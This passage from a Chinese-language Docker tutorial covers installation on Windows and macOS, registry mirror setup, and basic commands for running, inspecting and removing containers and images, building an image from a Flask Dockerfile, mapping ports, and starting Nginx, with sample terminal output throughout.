[&quot;http://hub-mirror.c.163.com&quot;]&#125;删除 Docker CE执行以下命令来删除 Docker CE：12# yum remove docker-ce# rm -rf /var/lib/dockerWindows Docker 安装win7、win8 系统win7、win8 等需要利用 docker toolbox 来安装，国内可以使用阿里云的镜像来下载，下载地址：http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/docker toolbox 是一个工具集，它主要包含以下一些内容：Docker CLI 客户端，用来运行docker引擎创建镜像和容器Docker Machine. 可以让你在windows的命令行中运行docker引擎命令Docker Compose. 用来运行docker-compose命令Kitematic. 这是Docker的GUI版本Docker QuickStart shell. 这是一个已经配置好Docker的命令行环境Oracle VM Virtualbox. 虚拟机下载完成之后直接点击安装，安装成功后，桌边会出现三个图标，入下图所示：如果系统显示 User Account Control 窗口来运行 VirtualBox 修改你的电脑，选择 Yes。$ 符号那你可以输入以下命令来执行1234567891011121314151617181920212223$ docker run hello-world Unable to find image 'hello-world:latest' locally Pulling repository hello-world 91c95931e552: Download complete a8219747be10: Download complete Status: Downloaded newer image for hello-world:latest Hello from Docker. This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: 1. The Docker Engine CLI client contacted the Docker Engine daemon. 2. The Docker Engine daemon pulled the "hello-world" image from the Docker Hub. (Assuming it was not already locally available.) 3. The Docker Engine daemon created a new container from that image which runs the executable that produces the output you are currently reading. 4. The Docker Engine daemon streamed that output to the Docker Engine CLI client, which sent it to your terminal. To try something more ambitious, you can run an Ubuntu container with: $ docker run -it ubuntu bash For more examples and ideas, visit: https://docs.docker.com/userguide/Win10 系统现在 Docker 有专门的 Win10 专业版系统的安装包，需要开启Hyper-V。应用和功能 -&gt; 程序和功能 -&gt; 启用或关闭Windows功能 -&gt; 选中Hyper-V安装 Toolbox最新版 Toolbox 下载地址： https://www.docker.com/get-docker点击 Download Desktop and Take a Tutorial，并下载 Windows 的版本，如果你还没有登录，会要求注册登录：运行安装文件双击下载的 Docker for Windows Installer 安装文件，一路 Next，点击 Finish 完成安装。安装完成后，Docker 会自动启动。通知栏上会出现个小鲸鱼的图标，这表示 Docker 正在运行。桌边也会出现三个图标，我们可以在命令行执行 docker version 来查看版本号，docker run hello-world 来载入测试镜像测试。如果没启动，你可以在 Windows 搜索 Docker 来启动，启动后，也可以在通知栏上看到小鲸鱼图标镜像加速鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：http://hub-mirror.c.163.com。新版的 Docker 使用 /etc/docker/daemon.json（Linux） 或者 %programdata%\docker\config\daemon.json（Windows） 来配置 Daemon。请在该配置文件中加入（没有该文件的话，请先建一个）：123&#123; &quot;registry-mirrors&quot;: [&quot;http://hub-mirror.c.163.com&quot;]&#125;MacOS Docker 安装使用 Homebrew 安装macOS 我们可以使用 Homebrew 来安装 Docker。Homebrew 的 Cask 已经支持 Docker for Mac，因此可以很方便的使用 Homebrew Cask 来进行安装：123456789101112$ brew cask install docker==&gt; Creating Caskroom at /usr/local/Caskroom==&gt; We'll set permissions properly so we won't need sudo in the futurePassword: # 输入 macOS 密码==&gt; Satisfying dependencies==&gt; Downloading https://download.docker.com/mac/stable/21090/Docker.dmg######################################################################## 100.0%==&gt; Verifying checksum for Cask docker==&gt; Installing Cask docker==&gt; Moving App 'Docker.app' to '/Applications/Docker.app'.&amp;#x1f37a; docker was successfully installed!在载入 Docker app 后，点击 Next，可能会询问你的 macOS 登陆密码，你输入即可。之后会弹出一个 Docker 运行的提示窗口，状态栏上也有有个小鲸鱼的图标。手动下载安装如果需要手动下载，请点击以下链接下载 Stable 或 Edge 版本的 Docker for Mac。如同 macOS 其它软件一样，安装也非常简单，双击下载的 .dmg 文件，然后将鲸鱼图标拖拽到 Application 文件夹即可。从应用中找到 Docker 图标并点击运行。可能会询问 macOS 的登陆密码，输入即可。点击顶部状态栏中的鲸鱼图标会弹出操作菜单。第一次点击图标，可能会看到这个安装成功的界面，点击 “Got it!” 可以关闭这个窗口。启动终端后，通过命令可以检查安装后的 Docker 版本。12$ docker --versionDocker version 17.09.1-ce, build 19e2cf6镜像加速鉴于国内网络问题，后续拉取 Docker 镜像十分缓慢，我们可以需要配置加速器来解决，我使用的是网易的镜像地址：http://hub-mirror.c.163.com。在任务栏点击 Docker for mac 应用图标 -&gt; Perferences… -&gt; Daemon -&gt; Registry mirrors。在列表中填写加速器地址即可。修改完成之后，点击 Apply &amp; Restart 按钮，Docker 就会重启并应用配置的镜像地址了。之后我们可以通过 docker info 来查看是否配置成功。12345$ docker info...Registry Mirrors: http://hub-mirror.c.163.comLive Restore Enabled: falseDocker 使用Docker Hello WorldDocker 允许你在容器内运行应用程序， 使用 docker run 命令来在容器内运行一个应用程序。输出Hello world1234567# docker run centos /bin/echo "Hello world"Unable to find image 'centos:latest' locallylatest: Pulling from library/centos8ba884070f61: Pull complete Digest: sha256:a799dd8a2ded4a83484bbae769d97655392b3f86533ceb7dd96bbac929809f3cStatus: Downloaded newer image for centos:latestHello world各个参数解析：docker: Docker 的二进制执行文件。run: 与前面的 docker 组合来运行一个容器。ceentos 指定要运行的镜像，Docker首先从本地主机上查找镜像是否存在，如果不存在，Docker 就会从镜像仓库 Docker Hub 下载公共镜像。/bin/echo “Hello world”: 在启动的容器里执行的命令以上命令完整的意思可以解释为：Docker 以 centos 镜像创建一个新容器，然后在容器里执行 bin/echo “Hello world”，然后输出结果。搜索docker hub中的镜像1# docker search centos运行交互式的容器我们通过docker的两个参数 -i -t，让docker运行的容器实现”对话”的能力12[root@localhost ~]# docker run -i -t centos /bin/bash[root@f566b922be2f /]#各个参数解析：-t：在新容器内指定一个伪终端或终端。-i：允许你对容器内的标准输入 (STDIN) 进行交互。我们可以通过运行exit命令或者使用CTRL+D来退出容器。启动容器 (后台模式)使用以下命令创建一个以进程方式运行的容器：12[root@localhost ~]# docker run -d centos /bin/sh -c "while true; do echo hello world; sleep 1; done"7e436b86913579f28f56b9b038e4782570b5beeb150e2e0ecd440201124814dc在输出中，我们没有看到期望的”hello world”，而是一串长字符，这个长字符串叫做容器ID，对每个容器来说都是唯一的，我们可以通过容器ID来查看对应的容器发生了什么。首先，我们需要确认容器有在运行，可以通过 docker ps 来查看123[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES7e436b869135 centos "/bin/sh -c 'while t…" 43 seconds ago Up 42 seconds competent_merkleCONTAINER ID：容器IDNAMES：自动分配的容器名称在容器内使用docker logs命令，查看容器内的标准输出：123// 如下两个命令的输出结果一致，都是好多个hello world# docker logs 7e436b869135# docker logs competent_merkle停止容器我们使用 docker stop 命令来停止容器:1# docker stop 7e436b869135通过docker ps查看，容器已经停止工作：1# docker ps也可以用下面的命令来停止：1# docker stop competent_merkleDocker 容器使用Docker 客户端直接输入 docker 命令来查看到 Docker 客户端的所有命令选项。可以通过命令 docker command –help 更深入的了解指定的 Docker 命令使用方法。例如我们要查看 docker stats 指令的具体使用方法：1234567891011[root@localhost ~]# docker stats --helpUsage: docker stats [OPTIONS] [CONTAINER...]Display a live stream of container(s) resource usage statisticsOptions: -a, --all Show all containers (default shows just running) --format string Pretty-print images using a Go template --no-stream Disable streaming stats and only pull the first result --no-trunc Do not truncate output运行一个web应用在docker容器中运行一个 Python Flask 应用来运行一个web应用。1234567891011121314151617181920212223242526[root@localhost ~]# docker pull training/webapp # 载入镜像Using default tag: latestlatest: Pulling from training/webappe190868d63f8: Pulling fs layer 909cd34c6fd7: Pulling fs layer 0b9bfabab7c1: Downloading a3ed95caeb02: Waiting 10bbbc0fc0ff: Waiting fca59b508e9f: Waiting e7ae2541b15b: Waiting 9dd97ef58ce9: Waiting a4c1b0cb7af7: Waiting latest: Pulling from training/webappe190868d63f8: Pull complete 909cd34c6fd7: Pull complete 0b9bfabab7c1: Pull complete a3ed95caeb02: Pull complete 10bbbc0fc0ff: Pull complete fca59b508e9f: Pull complete e7ae2541b15b: Pull complete 9dd97ef58ce9: Pull complete a4c1b0cb7af7: Pull complete Digest: sha256:06e9c1983bd6d5db5fba376ccd63bfa529e8d02f23d5079b8f74a616308fb11dStatus: Downloaded newer image for training/webapp:latest[root@localhost ~]# docker run -d -P training/webapp python app.pyab3dc2ea803335fee98c58b9bd55a9ef01d58a4602d75ec95a8fa3a97e403f5e参数说明:-d：让容器在后台运行。-P：将容器内部使用的网络端口映射到我们使用的主机上。查看 WEB 应用容器使用 docker ps 来查看我们正在运行的容器：123[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESab3dc2ea8033 training/webapp "python app.py" About a minute ago Up About a minute 0.0.0.0:32768-&gt;5000/tcp loving_turing这里多了端口信息。12PORTS0.0.0.0:32768-&gt;5000/tcpDocker 开放了 5000 端口（默认 Python Flask 端口）映射到主机端口 32768 上。这时我们可以通过浏览器访问WEB应用：http://192.168.0.130:32768也可以通过 -p 参数来设置不一样的端口：1[root@localhost ~]# docker run -d -p 5000:5000 training/webapp python app.pydocker ps查看正在运行的容器1234[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe18b3ff3ed87 training/webapp "python app.py" 3 seconds ago Up 2 seconds 0.0.0.0:5000-&gt;5000/tcp nervous_chandrasekharab3dc2ea8033 training/webapp "python app.py" 4 minutes ago Up 4 minutes 0.0.0.0:32768-&gt;5000/tcp loving_turing容器内部的 5000 端口映射到我们本地主机的 5000 端口上。网络端口的快捷方式通过 docker ps 命令可以查看到容器的端口映射，docker 还提供了另一个快捷方式 docker port，使用 docker port 可以查看指定 （ID 或者名字）容器的某个确定端口映射到宿主机的端口号。上面我们创建的 web 应用容器 ID 为 e18b3ff3ed87 名字为 nervous_chandrasekhar。我可以使用 docker port e18b3ff3ed87 或 docker port nervous_chandrasekhar 来查看容器端口的映射情况。1234[root@localhost ~]# docker port e18b3ff3ed875000/tcp -&gt; 0.0.0.0:5000[root@localhost ~]# docker port nervous_chandrasekhar5000/tcp -&gt; 0.0.0.0:5000查看 WEB 应用程序日志docker logs [ID或者名字] 可以查看容器内部的标准输出。12[root@localhost ~]# docker logs -f e18b3ff3ed87 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)-f：让 docker logs 像使用 tail -f 一样来输出容器内部的标准输出。从上面，我们可以看到应用程序使用的是 5000 端口并且能够查看到应用程序的访问日志。查看WEB应用程序容器的进程还可以使用 docker top 来查看容器内部运行的进程123[root@localhost ~]# docker top e18b3ff3ed87UID PID PPID C STIME TTY TIME CMDroot 21092 21074 0 04:45 ? 00:00:00 python app.py检查 WEB 应用程序使用 docker inspect 来查看 Docker 的底层信息。它会返回一个 JSON 文件记录着 Docker 容器的配置和状态信息。1234567891011121314151617181920212223[root@localhost ~]# docker inspect e18b3ff3ed87[ &#123; "Id": "e18b3ff3ed87fd4a5bbcb4d7d49506c8b08fea2354b3e9a735370da143a132a4", "Created": "2019-07-12T08:45:39.489607684Z", "Path": "python", "Args": [ "app.py" ], "State": &#123; "Status": "running", "Running": true, "Paused": false, "Restarting": false, "OOMKilled": false, "Dead": false, "Pid": 21092, "ExitCode": 0, "Error": "", "StartedAt": "2019-07-12T08:45:39.948487352Z", "FinishedAt": "0001-01-01T00:00:00Z" &#125;,......停止 WEB 应用容器12[root@localhost ~]# docker stop e18b3ff3ed87 e18b3ff3ed87重启WEB应用容器12[root@localhost ~]# docker start e18b3ff3ed87 e18b3ff3ed87docker ps -l 查询最后一次创建的容器：123[root@localhost ~]# docker ps -lCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESe18b3ff3ed87 training/webapp "python app.py" 8 minutes ago Up 27 seconds 0.0.0.0:5000-&gt;5000/tcp nervous_chandrasekhar正在运行的容器，我们可以使用 docker restart 命令来重启移除WEB应用容器使用 docker rm 命令来删除不需要的容器：12[root@localhost ~]# docker rm e18b3ff3ed87e18b3ff3ed87删除容器时，容器必须是停止状态，否则会报如下错误：12[root@localhost ~]# docker rm ab3dc2ea8033Error response from daemon: You cannot remove a running container ab3dc2ea803335fee98c58b9bd55a9ef01d58a4602d75ec95a8fa3a97e403f5e. Stop the container before attempting removal or force remove批量删除所有容器1[root@localhost ~]# docker rm `docker ps -a -q`Docker 镜像使用当运行容器时，使用的镜像如果在本地中不存在，docker 就会自动从 docker 镜像仓库中下载，默认是从 Docker Hub 公共镜像源下载。下面我们来学习：管理和使用本地 Docker 主机镜像创建镜像列出镜像列表可以使用 docker images 来列出本地主机上的镜像。123456[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEcentos latest 9f38484d220f 3 months ago 202MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MBtraining/webapp latest 6fae60ef3446 4 years ago 349MB各个选项说明:REPOSITORY：表示镜像的仓库源TAG：镜像的标签IMAGE ID：镜像IDCREATED：镜像创建时间SIZE：镜像大小同一仓库源可以有多个 TAG，代表这个仓库源的不同版本，如ubuntu仓库源里，有15.10、14.04等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。所以，我们如果要使用版本为15.10的ubuntu系统镜像来运行容器时，命令如下：12[root@localhost ~]# docker run -t -i ubuntu:15.10 /bin/bashroot@0c8e4aa0064f:/#如果要使用版本为14.04的ubuntu系统镜像来运行容器时，命令如下：12[root@localhost ~]# docker run -t -i ubuntu:14.04 /bin/bashroot@0c8e4aa0064f:/#如果你不指定一个镜像的版本标签，例如你只使用 ubuntu，docker 将默认使用 ubuntu:latest 镜像。获取一个新的镜像当我们在本地主机上使用一个不存在的镜像时 Docker 就会自动下载这个镜像。如果我们想预先下载这个镜像，我们可以使用 docker pull 命令来下载它。12345678[root@localhost ~]# docker pull ubuntu:14.0414.04: Pulling from library/ubuntua7344f52cb74: Pull complete 515c9bb51536: Pull complete e1eabe0537eb: Pull complete 4701f1215c13: Pull complete Digest: sha256:2f7c79927b346e436cc14c92bd4e5bd778c3bd7037f35bc639ac1589a7acfa90Status: Downloaded newer image for ubuntu:14.04下载完成后，我们可以直接使用这个镜像来运行容器。查找镜像可以从 Docker Hub 网站来搜索镜像，Docker Hub 网址为： https://hub.docker.com/也可以使用 docker search 命令来搜索镜像。比如我们需要一个nginx的镜像来作为我们的web服务。我们可以通过 docker search 命令搜索 nginx 来寻找适合我们的镜像。123456789101112131415161718192021222324252627[root@localhost ~]# docker search nginxNAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 11671 [OK] jwilder/nginx-proxy Automated Nginx reverse proxy for docker con… 1627 [OK]richarvey/nginx-php-fpm Container running Nginx + PHP-FPM capable of… 726 [OK]bitnami/nginx Bitnami nginx Docker Image 69 [OK]linuxserver/nginx An Nginx container, brought to you by LinuxS… 66 tiangolo/nginx-rtmp Docker image with Nginx using the nginx-rtmp… 48 [OK]nginx/nginx-ingress NGINX Ingress Controller for Kubernetes 20 nginxdemos/hello NGINX webserver that serves a simple page co… 18 [OK]schmunk42/nginx-redirect A very simple container to redirect HTTP tra… 17 [OK]jlesage/nginx-proxy-manager Docker container for Nginx Proxy Manager 17 [OK]crunchgeek/nginx-pagespeed Nginx with PageSpeed + GEO IP + VTS + more_s… 13 blacklabelops/nginx Dockerized Nginx Reverse Proxy Server. 12 [OK]centos/nginx-18-centos7 Platform for running nginx 1.8 or building n… 11 centos/nginx-112-centos7 Platform for running nginx 1.12 or building … 9 webdevops/nginx Nginx container 8 [OK]nginxinc/nginx-unprivileged Unprivileged NGINX Dockerfiles 8 sophos/nginx-vts-exporter Simple server that scrapes Nginx vts stats a… 5 [OK]nginx/nginx-prometheus-exporter NGINX Prometheus Exporter 4 1science/nginx Nginx Docker images that include Consul Temp… 4 [OK]mailu/nginx Mailu nginx frontend 3 [OK]travix/nginx NGinx reverse proxy 2 [OK]pebbletech/nginx-proxy nginx-proxy sets up a container running ngin… 2 [OK]centos/nginx-110-centos7 Platform for running nginx 1.10 or building … 0 wodby/nginx Generic nginx 0 [OK]ansibleplaybookbundle/nginx-apb An APB to deploy NGINX 0 [OK]NAME：镜像仓库源的名称DESCRIPTION：镜像的描述OFFICIAL：是否docker官方发布拖取镜像使用上图中的nginx官方版本的镜像，使用命令 docker pull 来下载镜像。12345678[root@localhost ~]# docker pull nginx Using default tag: latestlatest: Pulling from library/nginxfc7181108d40: Pull complete d2e987ca2267: Pull complete 0b760b431b11: Pull complete Digest: sha256:48cbeee0cb0a3b5e885e36222f969e0a2f41819a68e07aeb6631ca7cb356fed1Status: Downloaded newer image for nginx:latest下载完成后，我们就可以使用这个镜像了。1[root@localhost ~]# docker run nginx创建镜像当从docker镜像仓库中下载的镜像不能满足我们的需求时，我们可以通过以下两种方式对镜像进行更改。从已经创建的容器中更新镜像，并且提交这个镜像使用 Dockerfile 指令来创建一个新的镜像更新镜像更新镜像之前，需要使用镜像来创建一个容器。12[root@localhost ~]# docker run -t -i ubuntu:15.10 /bin/bashroot@387f1a8b1d86:/# apt-get update在运行的容器内使用 apt-get update 命令进行更新。在完成操作之后，输入 exit命令来退出这个容器。此时ID为387f1a8b1d86的容器，是按我们的需求更改的容器。我们可以通过命令 docker commit来提交容器副本。12[root@localhost ~]# docker commit -m="update" -a="sandu" 387f1a8b1d86 sandu/ubuntu:v2sha256:02c1ed8e875ca80c6089694e486e3e0b39833b55c8252bc62bf019eb9c8b4bde各个参数说明：-m:提交的描述信息-a:指定镜像作者387f1a8b1d86：容器IDsandu/ubuntu:v2:指定要创建的目标镜像名v2：表示的是TAG然后可以使用 docker images 命令来查看我们的新镜像 sandu/ubuntu:v2：123456789[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandu/ubuntu v2 02c1ed8e875c About a minute ago 137MBnginx latest f68d6e55e065 10 days ago 109MBubuntu 14.04 2c5e00d77a67 8 weeks ago 188MBcentos latest 9f38484d220f 3 months ago 202MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MBtraining/webapp latest 6fae60ef3446 4 years ago 349MB使用我们的新镜像 sandu/ubuntu来启动一个容器12[root@localhost ~]# docker run -t -i sandu/ubuntu:v2 /bin/bashroot@f396a8f61f80:/#构建镜像使用命令 docker build ， 从零开始来创建一个新的镜像。首先需要创建一个 Dockerfile 文件，其中包含一组指令来告诉 Docker 如何构建我们的镜像。注意：这里使用一个使用flask框架的后台模板，GitHub地址12345678910111213[root@localhost ~]# cat DockerfileFROM python:3.6ENV FLASK_APP gentelella.pyCOPY gentelella.py gunicorn.py requirements.txt config.py .env ./COPY app appCOPY migrations migrationsRUN pip install -r requirements.txtEXPOSE 5000CMD ["gunicorn", "--config", "gunicorn.py", "gentelella:app"]每一个指令都会在镜像上创建一个新的层，每一个指令的前缀都必须是大写的。第一条FROM，指定使用哪个镜像源RUN 指令告诉docker 在镜像内执行命令，安装了什么然后使用 Dockerfile 文件，通过 docker build 命令来构建一个镜像。1[root@localhost flask-gentelella-master]# docker build -t sandu/python:3.6 .参数说明：-t ：指定要创建的目标镜像名. ：Dockerfile 文件所在目录，可以指定Dockerfile 的绝对路径使用docker images 查看创建的镜像已经在列表中存在,镜像ID为3fc000939e8e1234567891011[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandu/python 3.6 3fc000939e8e 7 minutes ago 1.05GBsandu/ubuntu v2 02c1ed8e875c About an hour ago 137MBpython 3.6 f93001dcf9ed 9 hours ago 924MBnginx latest f68d6e55e065 10 days ago 109MBubuntu 14.04 2c5e00d77a67 8 weeks ago 188MBcentos latest 9f38484d220f 3 months ago 202MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MBtraining/webapp latest 6fae60ef3446 4 years ago 349MB可以使用新的镜像来创建容器12345[root@localhost ~]# docker run -d -p 5000:5000 --name gentelella --restart always sandu/python:3.6de249d54cf992151db57c27d99b7f127bb6017b5233e2c7f97e36ebc97cae342[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESde249d54cf99 sandu/python:3.6 "gunicorn --config g…" 5 seconds ago Up 3 seconds 0.0.0.0:5000-&gt;5000/tcp gentelella设置镜像标签可以使用 docker tag 命令，为镜像添加一个新的标签。docker tag 镜像ID，这里是 3fc000939e8e ,用户名称、镜像源名(repository name)和新的标签名(tag)。使用 docker images 命令可以看到，ID为3fc000939e8e的镜像多一个pro标签。123456789101112131415161718192021222324[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandu/python 3.6 3fc000939e8e 16 minutes ago 1.05GBsandu/ubuntu v2 02c1ed8e875c About an hour ago 137MBpython 3.6 f93001dcf9ed 9 hours ago 924MBnginx latest f68d6e55e065 10 days ago 109MBubuntu 14.04 2c5e00d77a67 8 weeks ago 188MBcentos latest 9f38484d220f 3 months ago 202MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MBtraining/webapp latest 6fae60ef3446 4 years ago 349MB[root@localhost ~]# docker tag 3fc000939e8e sandu/python:pro[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandu/python 3.6 3fc000939e8e 17 minutes ago 1.05GBsandu/python pro 3fc000939e8e 17 minutes ago 1.05GBsandu/ubuntu v2 02c1ed8e875c About an hour ago 137MBpython 3.6 f93001dcf9ed 9 hours ago 924MBnginx latest f68d6e55e065 10 days ago 109MBubuntu 14.04 2c5e00d77a67 8 weeks ago 188MBcentos latest 9f38484d220f 3 months ago 202MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MBtraining/webapp latest 6fae60ef3446 4 years ago 349MB删除镜像查看本地docker镜像123456789101112[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandu/python 3.6 3fc000939e8e 2 hours ago 1.05GBsandu/python pro 3fc000939e8e 2 hours ago 1.05GBsandu/ubuntu v2 02c1ed8e875c 3 hours ago 137MBpython 3.6 f93001dcf9ed 11 hours ago 924MBnginx latest f68d6e55e065 10 days ago 109MBubuntu 14.04 2c5e00d77a67 8 weeks ago 188MBcentos latest 9f38484d220f 3 months ago 202MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MBtraining/webapp latest 6fae60ef3446 4 years ago 349MB尝试删除本地镜像，发现无法直接删除镜像12[root@localhost ~]# docker rmi training/webappError response from daemon: conflict: unable to remove repository reference "training/webapp" (must force) - container ab3dc2ea8033 is using its referenced image 6fae60ef3446原因分析: 有关联docker容器，无法删除12# 查看镜像和容器的关联信息[root@localhost ~]# docker ps -a删除docker容器1234# 先停止容器，然后再删除[root@localhost ~]# docker stop ab3dc2ea8033[root@localhost ~]# docker rm ab3dc2ea8033ab3dc2ea8033删除docker镜像1234567891011121314151617[root@localhost ~]# docker rmi training/webappUntagged: training/webapp:latestUntagged: training/webapp@sha256:06e9c1983bd6d5db5fba376ccd63bfa529e8d02f23d5079b8f74a616308fb11dDeleted: sha256:6fae60ef344644649a39240b94d73b8ba9c67f898ede85cf8e947a887b3e6557Deleted: sha256:875bde2b9e2d99e7c1362993645a474fe621475c6fc1b1623c9ed5312b7bdeaeDeleted: sha256:bbdb5ee3757ef8f2633694016df5840fc3410422b37c22f98c0300e295ce75ccDeleted: sha256:d718446240e3f48a904ad4bbf2a1f61737c5d70df35b8210d674a9517cdc9803Deleted: sha256:a890440f4933412f9aafb056eb2f07f2276ed756631a81e960d4a8a6de5857a3Deleted: sha256:68a74799a9e67953725058ef21a530f100025088943446aa60c73fba7beebd47Deleted: sha256:b23e4b6b440d0e9ab4ffd7852fbf81edd6d5eb606e24d4950d83502e14af2856Deleted: sha256:f115b0453c71fb4d21fdb6f579201984bd5033ae28ed5908978576a19282418bDeleted: sha256:b0da82df3229cd06a2992449f2310caaa42f09fdfb088f4a98c5ea587ea85c7eDeleted: sha256:f6f162dad6e64715d3d07e21d4574733860a557f2f89228d07909c1f6f04e882Deleted: sha256:088f9eb16f16713e449903f7edb4016084de8234d73a45b1882cf29b1f753a5aDeleted: sha256:799115b9fdd1511e8af8a8a3c8b450d81aa842bbf3c9f88e9126d264b232c598Deleted: sha256:3549adbf614379d5c33ef0c5c6486a0d3f577ba3341f573be91b4ba1d8c60ce4Deleted: sha256:1154ba695078d29ea6c4e1adb55c463959cd77509adf09710e2315827d66271a删除成功1234567891011[root@localhost ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEsandu/python 3.6 3fc000939e8e 2 hours ago 1.05GBsandu/python pro 3fc000939e8e 2 hours ago 1.05GBsandu/ubuntu v2 02c1ed8e875c 3 hours ago 137MBpython 3.6 f93001dcf9ed 11 hours ago 924MBnginx latest f68d6e55e065 10 days ago 109MBubuntu 14.04 2c5e00d77a67 8 weeks ago 188MBcentos latest 9f38484d220f 3 months ago 202MBhello-world latest fce289e99eb9 6 months ago 1.84kBubuntu 15.10 9b9cb95443b5 2 years ago 137MB批量删除所有镜像1[root@localhost ~]# docker rmi `docker images -q`Docker 容器连接网络端口映射使用 -P 参数创建一个容器，使用 docker ps 可以看到容器端口 5000 绑定主机端口 32770。12345[root@localhost ~]# docker run -d -P --name gentelella --restart always sandu/python:3.6f386d3fcef079f51668f583cf88e6b20b5961a62502d2a1c09c6ed17ae526617[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESf386d3fcef07 sandu/python:3.6 "gunicorn --config g…" 5 seconds ago Up 4 seconds 0.0.0.0:32770-&gt;5000/tcp gentelella也可以使用 -p 标识来指定容器端口绑定到主机端口。12345[root@localhost ~]# docker run -d -p 32768:5000 --name gentelella --restart always sandu/python:3.6 90680982825f131b6f950e3ad8543ddd51a76b07b75345376a852fe886c28754[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES90680982825f sandu/python:3.6 "gunicorn --config g…" 4 seconds ago Up 3 seconds 0.0.0.0:32768-&gt;5000/tcp gentelella两种方式的区别是:-P :是容器内部端口随机映射到主机的高端口。-p : 是容器内部端口绑定到指定的主机端口。(主机端口：容器内部端口)可以指定容器绑定的网络地址，比如绑定 127.0.0.1。12345[root@localhost ~]# docker run -d -p 127.0.0.1:32768:5000 --name gentelella --restart always sandu/python:3.6f4ff4bc6239e944b0683dd9c81f8af78793e69f02ace5ef3a251ee88cd296d93[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESf4ff4bc6239e sandu/python:3.6 "gunicorn --config g…" 4 seconds ago Up 3 seconds 127.0.0.1:32768-&gt;5000/tcp gentelella这样我们就可以通过访问 127.0.0.1:32768 来访问容器的 5000 端口。12345# 停止并删除容器[root@localhost ~]# docker stop gentelellagentelella[root@localhost ~]# docker rm gentelellagentelella默认都是绑定 tcp 端口，如果要绑定 UDP 端口，可以在端口后面加上 /udp。12345[root@localhost ~]# docker run -d -p 127.0.0.1:32768:5000/udp --name gentelella --restart always sandu/python:3.617683315e22f1c9c611fea955bd2824a6d324ee2d5f8647a9f5811f73339b1b1[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES17683315e22f sandu/python:3.6 "gunicorn --config g…" 4 seconds ago Up 3 seconds 5000/tcp, 127.0.0.1:32768-&gt;5000/udp gentelelladocker port 命令可以让我们快捷地查看端口的绑定情况。12345# 默认是tcp端口，查看udp端口的话需要在最后加上/udp[root@localhost ~]# docker port gentelella 5000Error: No public port '5000/tcp' published for gentelella[root@localhost ~]# docker port gentelella 5000/udp127.0.0.1:32768Docker容器连接端口映射并不是唯一把 docker 连接到另一个容器的方法。docker 有一个连接系统允许将多个容器连接在一起，共享连接信息。docker 连接会创建一个父子关系，其中父容器可以看到子容器的信息。容器命名当我们创建一个容器的时候，docker 会自动对它进行命名。另外，我们也可以使用 –name 标识来命名容器，例如：12[root@localhost ~]# docker run -d -p 127.0.0.1:32768:5000 --name gentelella --restart always sandu/python:3.6f4ff4bc6239e944b0683dd9c81f8af78793e69f02ace5ef3a251ee88cd296d93可以使用 docker ps 命令来查看容器名称。123[root@localhost ~]# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMESf4ff4bc6239e sandu/python:3.6 "gunicorn --config g…" 4 seconds ago Up 3 seconds 127.0.0.1:32768-&gt;5000/tcp gentelellaDocker实例Docker 安装 Nginxdocker pull nginx 命令安装查找 Docker Hub 上的 nginx 镜像1234567[root@localhost ~]# docker search nginxNAME DESCRIPTION STARS OFFICIAL AUTOMATEDnginx Official build of Nginx. 11676 [OK] jwilder/nginx-proxy Automated Nginx reverse proxy for docker con… 1627 [OK]richarvey/nginx-php-fpm Container running Nginx + PHP-FPM capable of… 726 [OK]bitnami/nginx Bitnami nginx Docker Image 69 [OK]......拉取官方的镜像12345[root@localhost ~]# docker pull nginxUsing default tag: latestlatest: Pulling from library/nginxDigest: sha256:48cbeee0cb0a3b5e885e36222f969e0a2f41819a68e07aeb6631ca7cb356fed1Status: Image is up to date for nginx:latest等待下载完成后，我们就可以在本地镜像列表里查到 REPOSITORY 为 nginx 的镜像。123[root@localhost ~]# docker images nginxREPOSITORY TAG IMAGE ID CREATED SIZEnginx latest f68d6e55e065 10 days ago 109MB以下命令使用 NGINX 默认的配置来启动一个 Nginx 容器实例：12[root@localhost ~]# docker run --name test_docker_nginx -p 8081:80 -d nginxc30cd0d51b31eaf3999ceee9724c269858e80417e8f0f03049127886f9b38134参数解析：test_docker_nginx：容器名称-d：设置容器在后台一直运行-p：端口进行映射，将本地的8081端口映射到容器内部的80端口执行以上命令会生成一串字符串，类似c30cd0d51b31eaf3999ceee9724c269858e80417e8f0f03049127886f9b38134**，这个表示容器的 